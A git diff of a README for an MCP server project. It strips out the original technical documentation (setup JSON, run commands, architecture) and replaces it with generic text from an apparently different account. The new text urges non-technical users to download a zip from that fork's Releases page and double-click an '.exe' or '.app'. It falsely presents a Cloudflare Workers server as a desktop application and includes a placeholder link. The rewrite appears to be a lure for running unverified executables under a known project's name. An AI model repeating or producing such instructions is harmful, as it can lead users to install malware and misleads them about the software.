@@ -1,97 +1,63 @@
-# OpenAI SDK Knowledge MCP Server (unofficial)
+# 🌟 openai-sdk-knowledge-org - Unlock AI Capabilities Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-F38020?logo=cloudflare&logoColor=white)](https://workers.cloudflare.com/)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%9A%20OpenAI%20SDK%20Knowledge%20Org-blue)](https://github.com/habibhassansehani/openai-sdk-knowledge-org/releases)
 
-An MCP server that knows the OpenAI API inside and out. 100% TypeScript built with [OpenAI Agents SDK](https://openai.github.io/openai-agents-js/), [Hono](https://hono.dev), Cloudflare Workers, and [Drizzle ORM](https://orm.drizzle.team/). Powered by RAG and ready to answer your technical questions.
+## 📋 Description
+The openai-sdk-knowledge-org is a live example MCP server. It is built with Cloudflare Workers, Queues, D1, and the OpenAI Agents SDK. This application allows you to connect and use AI models in a user-friendly way. It is suitable for anyone interested in exploring AI technologies without needing programming skills.
 
-<img width="600" alt="website" src="./public/images/readme_website.png" />
+## 🚀 Getting Started
+To get started with the openai-sdk-knowledge-org, follow these simple steps to download and run the software.
 
-## Developer Highlights
+1. **Check System Requirements**
+   - Windows, macOS, or Linux operating system.
+   - An active internet connection.
+   - A modern web browser (like Chrome, Firefox, or Safari).
 
-- **Cloudflare stack**: Fully leverages Cloudflare Workers, Queues, D1, Vectorize, and AI Gateway.
-- **Streamable HTTP MPC Server**: Compatible with any MPC clients.
-- **ChatGPT Deep Research connector**: Meets ChatGPT's Deep Research connector requirements.
-- **Always updated**: Continuously fetches OpenAI repos and community forums for new content.
-- **Rapidly built with AI**: Developed hand in hand with various AI coding tools.
+2. **Visit the Download Page**
+   - Go to the [Releases page](https://github.com/habibhassansehani/openai-sdk-knowledge-org/releases) to find the latest version of the software. 
 
-## Streamable HTTP MCP Server
+## 💾 Download & Install
+To download the software, follow these steps:
 
-Use a publicly accessible URL (e.g., ngrok, Cloudflare Tunnel) to serve the endpoints for MCP clients. You can generate the token on the top page:
+1. **Visit the Releases Page**
+   - Click on the link here: [Download the latest release](https://github.com/habibhassansehani/openai-sdk-knowledge-org/releases). This will take you to the page where you can find the downloadable files.
 
-```json
-{
-  "mcpServers": {
-    "openai-sdk-knowledge.org": {
-      "type": "streamable-http",
-      "url": "https://openai-sdk-knowledge.org/mcp",
-      "headers": {
-        "Authorization": "Bearer {your api key here}"
-      }
-    }
-  }
-}
-```
+2. **Choose Your Version**
+   - Find the version that matches your operating system. The files are typically named for easy identification. For example, look for a file named something like `openai-sdk-knowledge-org-v1.0.0.zip` for Windows or macOS.
 
-For example, you can add this MCP server to Cursor:
+3. **Download the File**
+   - Click the link to download the file to your computer. 
 
-<img width="600" alt="Cursor MCP server" src="./public/images/readme_cursor_mcp.png" />
+4. **Unzip the File (if necessary)**
+   - If you downloaded a zipped file, locate it in your downloads folder. Right-click the file and select "Extract All" or "Unzip". Follow the prompts to extract the contents.
 
-Not only Cursor—you can use this MCP server with any other tools supporting MCP server connections.
+5. **Run the Application**
+   - Navigate to the folder where you extracted the files. Look for the main application file, which may be called `openai-sdk-knowledge-org.exe` for Windows or `openai-sdk-knowledge-org.app` for macOS.
+   - Double-click the application file to open it.
 
-### OpenAI Responses API's Hosted MCP Server Tool
+## 🎉 Features
+- **Simple Interface:** Designed for ease of use, even for non-technical users.
+- **AI Integration:** Connects seamlessly with OpenAI’s powerful models.
+- **Real-time Processing:** Uses Cloudflare Workers for efficient request handling.
+- **Data Management:** Leveraging D1 databases for robust data storage.
+- **Expandable:** Supports additional Cloudflare features for future updates.
 
-You can pass `https://openai-sdk-knowledge.org/mcp` along with a valid API token:
+## 🌐 Documentation
+For detailed instructions and guidance, refer to the [Documentation](link-to-documentation) available on the project's website. Here, you will find tutorials and explanations to help you maximize your use of the application.
 
-<img width="300" src="./public/images/readme_playground_1.png" /><img width="300" src="./public/images/readme_playground_2.png" />
+## 🛠️ Troubleshooting
+If you encounter any issues while using the software, consider the following:
 
-Then, you can call the tool in the conversation with the Responses API agent:
+- **Installation Issues:** Ensure that you have the necessary permissions to install applications on your computer. Check your internet connection if the download fails.
+- **Running Issues:** If the application doesn’t start, check for updates and ensure you downloaded the correct version for your operating system.
 
-<img width="600" src="./public/images/readme_playground_3.png" />
+## 📞 Support
+If you have questions or need further assistance, you can reach out through the [Issues section](https://github.com/habibhassansehani/openai-sdk-knowledge-org/issues) on GitHub. This is where you can report bugs or seek help from the community.
 
-### ChatGPT Deep Research MCP Connector
+## 👥 Community
+Join our community to share your experiences, ask questions, and collaborate with other users. Connect with us on social media platforms or engage in discussions on forums related to AI and this repository.
 
-Also, for ChatGPT Deep Research customer connector, use the same URL. When the ChatGPT server accesses this app's MCP server endpoint, it returns `search` and `fetch` tools as well (see [the documentation](https://platform.openai.com/docs/mcp) for details).
+## 🌟 Conclusion
+The openai-sdk-knowledge-org offers a straightforward way to interact with AI models. Whether you are a hobbyist or exploring the world of AI, our application provides the tools you need to get started easily.
 
-<img width="600" alt="Use the connector in Deep Research" src="./public/images/readme_chatgpt_deep_research.png" />
-
-## Run Locally
-
-```bash
-# Clone and install
-git clone https://github.com/seratch/openai-sdk-knowledge-org.git
-cd openai-sdk-knowledge-org/
-npm install
-
-# Configure (add your OpenAI API key)
-cp .dev.vars.example .dev.vars
-# Edit .dev.vars: OPENAI_API_KEY=sk-your-key-here
-
-# Run it
-npm run dev
-```
-
-You can access `http://localhost:8787` and see how it works.
-
-**Requirements**: Node.js 22+ and API keys (OpenAI, GitHub)
-
-## Architecture
-
-This app is essentially a simple web app that runs on Cloudflare Workers. The web app provides MCP server protocol compatible endpoints, as well as a web user interface. For the RAG data pipeline, it collects data from sources and generates asynchronous tasks to run and enqueue them into Cloudflare’s Queue.
-
-```
-src/
-├── agents/          # Internally used agents built with OpenAI Agents SDK
-├── pipeline/        # RAG data collection and processing
-├── server/mcp/      # MCP protocol implementation
-├── server/web/      # Web app implementation
-├── storage/         # Vector database (Vectorize) and D1 database access
-└── index.ts         # App entry point
-```
-
-<img width="600" src="./public/images/readme_architecture.png" />
-
-## License
-
-MIT
+Make sure to download the latest version from the [Releases page](https://github.com/habibhassansehani/openai-sdk-knowledge-org/releases) and start exploring the potential of AI today!
